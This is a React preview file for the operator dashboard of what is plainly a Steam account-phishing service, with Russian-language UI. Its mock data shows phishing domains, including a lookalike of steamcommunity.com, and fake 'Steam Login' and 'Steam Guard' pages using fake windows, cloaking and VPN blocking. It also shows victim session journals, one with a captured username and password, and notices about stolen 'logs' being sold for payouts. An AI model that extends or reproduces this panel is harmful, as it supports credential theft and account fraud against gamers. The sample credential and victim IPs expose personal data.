import { createRoot } from "react-dom/client";
import { useEffect, useId, useRef, useState } from "react";
import Dashboard from "./Dashboard";
import Sites from "./Sites";
import SettingsPage from "./Settings";
import BranchPage, {
  MOCK_BRANCHES,
  branchSectionToView,
  type BranchSection,
} from "./Branch";
import WalletPage from "./Wallet";
import TopPage from "./Top";
import AnalyticsPage from "./Analytics";
import { ErrorState, SkeletonState } from "./components/DashboardBlocks";
import { UploadToastGallery } from "./components/ui/ActionToastHost";
import {
  SidebarNav,
  buildWorkerNavGroups,
  isBranchCabinetView,
  workerMobileItems,
  type BranchMembership,
} from "./components/ui/dashboard-sidebar";
import { createMockOverview } from "./mock";
import type { DashboardApi } from "./types";
import type { SiteLink, SitesApi } from "./sitesTypes";
import "./preview.css";

function viewToBranchSection(view: string): BranchSection {
  if (view === "branch-create") return "create";
  if (view === "branch-overview") return "overview";
  if (view === "branch-members") return "members";
  if (view === "branch-settings") return "settings";
  if (view === "branch-manuals") return "manuals";
  return "catalog";
}

function resolvePreviewMembership(
  state: string | null,
  view: string,
): BranchMembership {
  if (state === "owner" || state === "member") return state;
  if (
    view === "branch-overview" ||
    view === "branch-members" ||
    view === "branch-settings" ||
    view === "branch-manuals"
  ) {
    return "owner";
  }
  return "none";
}

const logoUrl = new URL(
  "../../../panel/worker/assets/logo.png",
  import.meta.url,
).href;

const PREVIEW_BALANCE = 1842.68;
const PREVIEW_FROZEN = 126.4;
const PREVIEW_AVAILABLE = PREVIEW_BALANCE - PREVIEW_FROZEN;

const PREVIEW_NOTIFS = [
    {
      id: "1",
      title: "falconspro.icu",
      body: "Бан: google",
      time: "26 авг. в 18:24",
      unread: true,
      severity: "danger" as const,
    },
    {
      id: "1b",
      title: "falconspro.icu",
      body: "Бан: whois",
      time: "26 авг. в 18:24",
      unread: true,
      severity: "danger" as const,
    },
    {
      id: "3",
      title: "Лог продан",
      body: "Ваш лог был успешно продан, средства начислены и заморожены на 12ч.",
      time: "26 авг. в 18:23",
      unread: true,
      severity: "info" as const,
    },
    {
      id: "2",
      title: "Холд снят",
      body: "Лог #829379: $3.41 доступны к выводу (продажа $4.26).",
      time: "26 авг. в 18:22",
      unread: true,
      severity: "info" as const,
    },
  {
    id: "4",
    title: "NS-записи домена",
    body: "У домена steemcommunity.com сменились NS. Обновите записи у регистратора.",
    time: "09 авг. в 23:42",
    unread: false,
    severity: "warn" as const,
  },
];

function NotifSeverityIcon({ severity }: { severity: "danger" | "warn" | "info" }) {
  if (severity === "danger") {
    return (
      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
        <path
          d="M12 4 21 20H3L12 4Z"
          stroke="currentColor"
          strokeWidth="1.5"
          strokeLinejoin="round"
        />
        <path
          d="M12 9v5M12 17h.01"
          stroke="currentColor"
          strokeWidth="1.7"
          strokeLinecap="round"
        />
      </svg>
    );
  }
  return (
    <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <circle cx="12" cy="12" r="8.5" stroke="currentColor" strokeWidth="1.5" />
      <path
        d="M12 11v5M12 8h.01"
        stroke="currentColor"
        strokeWidth="1.7"
        strokeLinecap="round"
      />
    </svg>
  );
}

function WalletIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path
        d="M4 8.2h14.5A1.5 1.5 0 0 1 20 9.7v8.1A1.5 1.5 0 0 1 18.5 19.3H5.5A1.5 1.5 0 0 1 4 17.8V8.2Z"
        stroke="currentColor"
        strokeWidth="1.5"
        strokeLinejoin="round"
      />
      <path
        d="M4 8.2V6.8A1.5 1.5 0 0 1 5.5 5.3h10.2"
        stroke="currentColor"
        strokeWidth="1.5"
        strokeLinecap="round"
      />
      <path
        d="M15.2 13.2h3.3v2.2h-3.3a1.1 1.1 0 0 1 0-2.2Z"
        stroke="currentColor"
        strokeWidth="1.5"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function money(value: number) {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
  }).format(value);
}

window.WorkerViews = {};
window.WorkerPrefs = {
  get: () => ({
    lang: "ru",
    currency: "USD",
    rate: 1,
    defaultPeriod: 14,
  }),
};
window.WorkerFormat = {
  money: (value) =>
    new Intl.NumberFormat("en-US", {
      style: "currency",
      currency: "USD",
      minimumFractionDigits: 2,
    }).format(value),
  date: (value) =>
    new Date(value).toLocaleString("ru-RU", {
      day: "numeric",
      month: "short",
      hour: "2-digit",
      minute: "2-digit",
    }),
  shortDayLabel: (value) =>
    new Date(`${value}T12:00:00`).toLocaleDateString("ru-RU", {
      day: "numeric",
      month: "short",
    }),
  shortDayTime: (value) => value,
  checkDateTime: (value) => value,
  appAsset: (path) => `/app/${path}`,
};
window.WorkerI18n = {
  lang: () => "ru",
  t: (key) => key,
};

const overview = createMockOverview(14);
const previewApi: DashboardApi = {
  async getOverview(days) {
    return createMockOverview(days);
  },
  async getLogDetail(sourceId) {
    return (
      [...overview.recentLogs, ...overview.recentMafiles].find(
        (event) => event.sourceId === sourceId || event.id === sourceId,
      ) || overview.recentLogs[0]
    );
  },
  async runLogAction(_sourceId, action) {
    if (action === "sell") return { saleStatus: "pending" };
    if (action === "process") return { processStatus: "pending" };
    if (action === "check-valid") return { ok: true, pending: true, taskId: "preview" };
    return { ok: true };
  },
  async pollCheckValid(_sourceId) {
    const log =
      [...overview.recentLogs, ...overview.recentMafiles].find(
        (event) => event.sessionInvalid,
      ) || overview.recentLogs[0];
    return { pending: false, done: true, log };
  },
};

function go(view: string) {
  const url = new URL(window.location.href);
  url.searchParams.set("view", view);
  window.location.href = url.toString();
}

function PreviewSidebar({
  activeView,
  workspaceId,
  onWorkspaceSelect,
  membership,
}: {
  activeView: string;
  workspaceId: string;
  onWorkspaceSelect: (id: string) => void;
  membership: BranchMembership;
}) {
  const sidebarActiveId =
    activeView === "branch-create" && membership === "none"
      ? "branch"
      : activeView;

  return (
    <aside className="preview-sidebar">
      <SidebarNav
        logoUrl={logoUrl}
        activeId={sidebarActiveId}
        activeWorkspace={workspaceId}
        onWorkspaceSelect={onWorkspaceSelect}
        groups={buildWorkerNavGroups(membership)}
        onSelect={(id) => {
          if (id === "logout") return;
          go(id);
        }}
      />
    </aside>
  );
}

function PreviewTopbar() {
  const [notifOpen, setNotifOpen] = useState(false);
  const [balanceOpen, setBalanceOpen] = useState(false);
  const [notifs, setNotifs] = useState(PREVIEW_NOTIFS);
  const actionsRef = useRef<HTMLDivElement>(null);
  const notifId = useId();
  const balanceId = useId();
  const unread = notifs.filter((item) => item.unread).length;

  useEffect(() => {
    if (!notifOpen && !balanceOpen) return;
    const onPointer = (event: MouseEvent) => {
      if (!actionsRef.current?.contains(event.target as Node)) {
        setNotifOpen(false);
        setBalanceOpen(false);
      }
    };
    const onKey = (event: KeyboardEvent) => {
      if (event.key === "Escape") {
        setNotifOpen(false);
        setBalanceOpen(false);
      }
    };
    document.addEventListener("mousedown", onPointer);
    document.addEventListener("keydown", onKey);
    return () => {
      document.removeEventListener("mousedown", onPointer);
      document.removeEventListener("keydown", onKey);
    };
  }, [notifOpen, balanceOpen]);

  return (
    <header className="preview-topbar">
      <div className="preview-topbar__user">
        <div className="preview-topbar__avatar">
          <img src={logoUrl} alt="" width={32} height={32} />
        </div>
        <div className="preview-topbar__meta">
          <strong>demo_operator</strong>
          <small>user</small>
        </div>
      </div>
      <div className="preview-topbar__actions" ref={actionsRef}>
        <div className={`preview-balance-wrap${balanceOpen ? " is-open" : ""}`}>
          <button
            type="button"
            className="preview-balance"
            aria-expanded={balanceOpen}
            aria-controls={balanceId}
            onClick={() => {
              setNotifOpen(false);
              setBalanceOpen((open) => !open);
            }}
          >
            <WalletIcon />
            <span>{money(PREVIEW_BALANCE)}</span>
          </button>
          <div className="preview-balance-tip" role="tooltip">
            Заморожено {money(PREVIEW_FROZEN)}
          </div>
          <div
            className="preview-balance-menu"
            id={balanceId}
            hidden={!balanceOpen}
            role="dialog"
            aria-label="Баланс"
          >
            <div className="preview-balance-menu__row">
              <span>Доступно</span>
              <strong>{money(PREVIEW_AVAILABLE)}</strong>
            </div>
            <div className="preview-balance-menu__row">
              <span>Заморожено</span>
              <strong>{money(PREVIEW_FROZEN)}</strong>
            </div>
            <div className="preview-balance-menu__row is-total">
              <span>Всего</span>
              <strong>{money(PREVIEW_BALANCE)}</strong>
            </div>
            <button
              type="button"
              className="preview-balance-menu__cta"
              onClick={() => {
                setBalanceOpen(false);
                go("wallet");
              }}
            >
              Вывести средства
            </button>
          </div>
        </div>

        <div className={`preview-notif-wrap${notifOpen ? " is-open" : ""}`}>
          <button
            className="preview-notif"
            type="button"
            aria-label="Уведомления"
            aria-expanded={notifOpen}
            aria-controls={notifId}
            onClick={() => {
              setBalanceOpen(false);
              setNotifOpen((open) => !open);
            }}
          >
            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path
                d="M12 4.5a5 5 0 0 1 5 5v2.2c0 .8.3 1.6.8 2.2l.7.8H5.5l.7-.8c.5-.6.8-1.4.8-2.2V9.5a5 5 0 0 1 5-5Z"
                stroke="currentColor"
                strokeWidth="1.5"
                strokeLinejoin="round"
              />
              <path
                d="M10 18.2a2.2 2.2 0 0 0 4 0"
                stroke="currentColor"
                strokeWidth="1.5"
                strokeLinecap="round"
              />
            </svg>
            {unread > 0 ? <span className="preview-notif__dot" /> : null}
          </button>
          <div
            className="preview-notif-menu"
            id={notifId}
            hidden={!notifOpen}
            role="dialog"
            aria-label="Уведомления"
          >
            <div className="preview-notif-menu__head">
              <div className="preview-notif-menu__heading">
                <span className="preview-notif-menu__title-row">
                  <strong>Уведомления</strong>
                  {notifs.length > 0 ? (
                    <span className="preview-notif-menu__count">{notifs.length}</span>
                  ) : null}
                </span>
                <span className="preview-notif-menu__subtitle">
                  Баны, паузы доменов и важные сигналы
                </span>
              </div>
              <button
                type="button"
                className="preview-notif-menu__mark"
                disabled={unread === 0}
                onClick={() =>
                  setNotifs((items) =>
                    items.map((item) => ({ ...item, unread: false })),
                  )
                }
              >
                Прочитать все
              </button>
            </div>
            <div className="preview-notif-menu__list">
              {notifs.map((item) => (
                <button
                  key={item.id}
                  type="button"
                  className={`preview-notif-item is-${item.severity}${item.unread ? " is-unread" : " is-read"}`}
                  onClick={() =>
                    setNotifs((items) =>
                      items.map((n) =>
                        n.id === item.id ? { ...n, unread: false } : n,
                      ),
                    )
                  }
                >
                  <span className="preview-notif-item__accent" aria-hidden="true" />
                  <span className="preview-notif-item__icon" aria-hidden="true">
                    <NotifSeverityIcon severity={item.severity} />
                  </span>
                  <span className="preview-notif-item__body">
                    <span className="preview-notif-item__head">
                      <span className="preview-notif-item__title">
                        {item.unread ? (
                          <span className="preview-notif-item__dot" aria-hidden="true" />
                        ) : null}
                        {item.title}
                      </span>
                      <time>{item.time}</time>
                    </span>
                    <span className="preview-notif-item__msg">{item.body}</span>
                  </span>
                  <svg
                    className="preview-notif-item__chevron"
                    viewBox="0 0 24 24"
                    fill="none"
                    aria-hidden="true"
                  >
                    <path
                      d="m9 6 6 6-6 6"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>
    </header>
  );
}

function PreviewMobileBar({
  activeView,
  membership,
}: {
  activeView: string;
  membership: BranchMembership;
}) {
  const items = workerMobileItems(membership);
  return (
    <nav className="preview-mobile-bar" aria-label="Мобильная навигация">
      {items.map((item) => (
        <button
          key={item.id}
          type="button"
          className={item.id === activeView ? "is-active" : undefined}
          onClick={() => go(item.id)}
        >
          <item.icon strokeWidth={1.5} />
          <span>{item.title}</span>
        </button>
      ))}
    </nav>
  );
}

const previewSitesApi: SitesApi = {
  async listDomains() {
    return {
      domains: [
        {
          id: 1,
          domain: "demo-shop.example",
          online: 12,
          isOwn: true,
          isTeamPublic: false,
          isPaused: false,
          createdAt: new Date(Date.now() - 3600_000).toISOString(),
          linksCount: 3,
          stats: { views: 420, clicks: 88, auths: 31, logs: 9, mafiles: 2 },
          ip: "185.0.0.1",
          bindType: "ip",
          banChecks: {
            updatedAt: new Date().toISOString(),
            google: { clean: true },
            cloudflare: { clean: true },
            whois: { clean: true },
          },
        },
        {
          id: 2,
          domain: "steemcommunity.com",
          online: 3,
          isOwn: false,
          isTeamPublic: true,
          isPaused: false,
          createdAt: new Date(Date.now() - 86400_000 * 6).toISOString(),
          linksCount: 2,
          stats: { views: 128, clicks: 24, auths: 7, logs: 2, mafiles: 0 },
          bindType: "cloudflare",
          bindNs: ["darwin.ns.cloudflare.com", "maeve.ns.cloudflare.com"],
          banChecks: {
            updatedAt: new Date().toISOString(),
            google: { banned: true },
            cloudflare: { clean: true },
            whois: { clean: true },
          },
        },
        {
          id: 3,
          domain: "falconspro.icu",
          online: 0,
          isOwn: true,
          isTeamPublic: false,
          isPaused: true,
          createdAt: new Date(Date.now() - 86400_000 * 16).toISOString(),
          linksCount: 0,
          stats: { views: 0, clicks: 0, auths: 0, logs: 0, mafiles: 0 },
          banChecks: {
            updatedAt: new Date().toISOString(),
            google: { clean: true },
            cloudflare: { banned: true },
            whois: { clean: true },
          },
        },
      ],
    };
  },
  async getDomain(id) {
    const list = await previewSitesApi.listDomains();
    const domain = list.domains.find((row) => row.id === id) || list.domains[0];
    const linksByDomain: Record<number, SiteLink[]> = {
      1: [
        {
          id: 11,
          path: "login",
          windowType: "FakeWindow",
          templateName: "Steam Login",
          iframe: true,
          stats: { views: 1329, clicks: 851, auths: 597, logs: 233, mafiles: 2, desktopPercent: 25.26 },
          countries: [
            { code: "US", count: 214 },
            { code: "UN", count: 198 },
            { code: "TR", count: 186 },
            { code: "CZ", count: 94 },
            { code: "DE", count: 81 },
            { code: "PT", count: 64 },
            { code: "ES", count: 51 },
            { code: "FR", count: 44 },
            { code: "PL", count: 38 },
            { code: "RO", count: 27 },
            { code: "BG", count: 18 },
            { code: "CN", count: 12 },
            { code: "FI", count: 9 },
            { code: "SE", count: 7 },
            { code: "KR", count: 5 },
          ],
          devices: [
            { name: "Apple", count: 342 },
            { name: "Android", count: 336 },
            { name: "Windows", count: 201 },
            { name: "Other", count: 19 },
          ],
        },
        {
          id: 12,
          path: "offer",
          windowType: "CurrentWindow",
          templateName: "Steam Market",
          cloaking: true,
          stats: { views: 140, clicks: 28, auths: 9, logs: 3, mafiles: 1, desktopPercent: 19.77 },
          countries: [
            { code: "TR", count: 42 },
            { code: "US", count: 31 },
            { code: "DE", count: 18 },
          ],
          devices: [
            { name: "Android", count: 61 },
            { name: "Apple", count: 48 },
            { name: "Windows", count: 22 },
          ],
        },
        {
          id: 13,
          path: "gift",
          windowType: "NewWindow",
          templateName: "Steam Guard",
          ban_vpn: true,
          isPaused: true,
          stats: { views: 60, clicks: 16, auths: 4, logs: 1, mafiles: 0 },
        },
      ],
      2: [
        {
          id: 21,
          path: "auth",
          windowType: "AboutBlank",
          templateName: "Team Login",
          iframe: true,
          stats: { views: 86, clicks: 18, auths: 5, logs: 2, mafiles: 0 },
        },
        {
          id: 22,
          path: "trade",
          windowType: "FakeWindow",
          templateName: "Trade Confirm",
          stats: { views: 42, clicks: 6, auths: 2, logs: 0, mafiles: 0 },
        },
      ],
      3: [],
    };
    return {
      domain,
      links: linksByDomain[domain.id] || [],
    };
  },
  async checkDomain() {
    return {
      ip: "185.0.0.1",
      ns: ["darwin.ns.cloudflare.com", "maeve.ns.cloudflare.com"],
    };
  },
  async getBindInfo() {
    return {
      ip: "192.162.199.140",
      ns: ["darwin.ns.cloudflare.com", "maeve.ns.cloudflare.com"],
    };
  },
  async createDomain(input) {
    const domain = typeof input === "string" ? input : input.domain;
    return {
      created: {
        ...(await previewSitesApi.getDomain(1)).domain,
        domain,
        id: 2,
      },
    };
  },
  async deleteDomain() {
    return { ok: true };
  },
  async listTemplates() {
    return [{ id: 1, name: "Steam Login", mine: true }];
  },
  async createLink() {
    return { ok: true };
  },
  async updateLink() {
    return { ok: true };
  },
  async deleteLink() {
    return { ok: true };
  },
  async getLinkJournal(_domainId, linkId) {
    if (linkId === 11) {
      return {
        sessions: [
          {
            id: "s1",
            ip: "5.112.162.243",
            language: "English",
            browser: "Chrome",
            os: "Windows",
            device: "Desktop",
            duration: "< 1 минуты",
            at: "26 авг. 2026 г. 13:42",
            events: [
              {
                id: "e1",
                text: "Введены верные данные",
                tag: "cazemustdie:Sunita@9826",
                tone: "info",
                at: "26 авг. 2026 г. 13:41",
              },
              {
                id: "e2",
                text: "Тип аккаунта: TwoFactorGuard",
                at: "26 авг. 2026 г. 13:41",
              },
              {
                id: "e3",
                text: "Не удалось отправить SMS для снятия в MaFile: возможно, не привязан телефон",
                tone: "error",
                at: "26 авг. 2026 г. 13:41",
              },
              {
                id: "e4",
                text: "Цена инвентаря: $-.--. Инвентарь скрыт",
                at: "26 авг. 2026 г. 13:42",
              },
              {
                id: "e5",
                text: "Нужен код для входа / подтверждение с телефона",
                at: "26 авг. 2026 г. 13:42",
              },
            ],
          },
          {
            id: "s2",
            ip: "106.222.214.43",
            language: "English",
            browser: "Chrome",
            os: "Windows",
            device: "Desktop",
            duration: "~ 3 минут",
            at: "26 авг. 2026 г. 13:38",
            events: [
              {
                id: "e6",
                text: "Пользователь открыл страницу авторизации Steam",
                tone: "info",
                at: "13:35:10",
              },
              {
                id: "e7",
                text: "Вход в аккаунт подтвержден через телефон",
                tone: "info",
                at: "13:36:44",
              },
              {
                id: "e8",
                text: "К аккаунту не привязан телефон",
                tone: "error",
                at: "13:37:02",
              },
              {
                id: "e9",
                text: "Нужно подтверждение с двухэтапки для снятия в лог",
                at: "13:37:51",
              },
            ],
          },
          {
            id: "s3",
            ip: "185.12.44.19",
            language: "Turkish",
            browser: "Safari",
            os: "Apple",
            device: "Mobile",
            duration: "< 1 минуты",
            at: "26 авг. 2026 г. 07:41",
            events: [
              {
                id: "e10",
                text: "Пользователь открыл страницу авторизации Steam",
                tone: "info",
                at: "07:41:10",
              },
            ],
          },
        ],
      };
    }
    return { sessions: [] };
  },
};

function Preview() {
  const params = new URLSearchParams(window.location.search);
  const state = params.get("state");
  const view = params.get("view") || "dashboard";
  const membership = resolvePreviewMembership(state, view);
  const [workspaceId, setWorkspaceId] = useState("steam");
  const data =
    state === "empty"
      ? { ...overview, recentLogs: [], recentMafiles: [], series: [] }
      : overview;
  const showBranch =
    view === "branch" || isBranchCabinetView(view);

  return (
    <div className="preview-shell">
      <PreviewSidebar
        activeView={view}
        workspaceId={workspaceId}
        onWorkspaceSelect={setWorkspaceId}
        membership={membership}
      />
      <div className="preview-workspace">
        <PreviewTopbar />
        <main className="preview-main">
          {state === "error" ? (
            <ErrorState
              message="Сервис временно не отвечает. Попробуйте повторить запрос."
              onRetry={() => window.location.reload()}
              onDemo={() => {
                window.location.href = "preview.html";
              }}
            />
          ) : state === "loading" ? (
            <SkeletonState />
          ) : view === "toasts" ? (
            <UploadToastGallery />
          ) : view === "sites" ? (
            <Sites
              context={{
                main: document.createElement("main"),
                user: {
                  telegramId: "1029384756",
                  username: "demo_operator",
                  firstName: "Алекс",
                },
              }}
              api={previewSitesApi}
            />
          ) : view === "settings" ? (
            <SettingsPage username="demo_operator" />
          ) : showBranch ? (
            <BranchPage
              initialBranches={state === "empty" ? [] : MOCK_BRANCHES}
              section={viewToBranchSection(view)}
              membership={membership}
              onNavigate={(section) => go(branchSectionToView(section as BranchSection))}
              onLeave={() => {
                const url = new URL(window.location.href);
                url.searchParams.set("view", "branch");
                url.searchParams.set("state", "none");
                window.location.href = url.toString();
              }}
            />
          ) : view === "wallet" ? (
            <WalletPage />
          ) : view === "top" ? (
            <TopPage />
          ) : view === "analytics" ? (
            <AnalyticsPage />
          ) : (
            <Dashboard
              context={{
                main: document.createElement("main"),
                user: {
                  telegramId: "1029384756",
                  username: "demo_operator",
                  firstName: "Алекс",
                },
              }}
              api={previewApi}
              initialData={data}
              initialDemo
            />
          )}
        </main>
      </div>
      <PreviewMobileBar activeView={view} membership={membership} />
    </div>
  );
}

createRoot(document.getElementById("root")!).render(<Preview />);
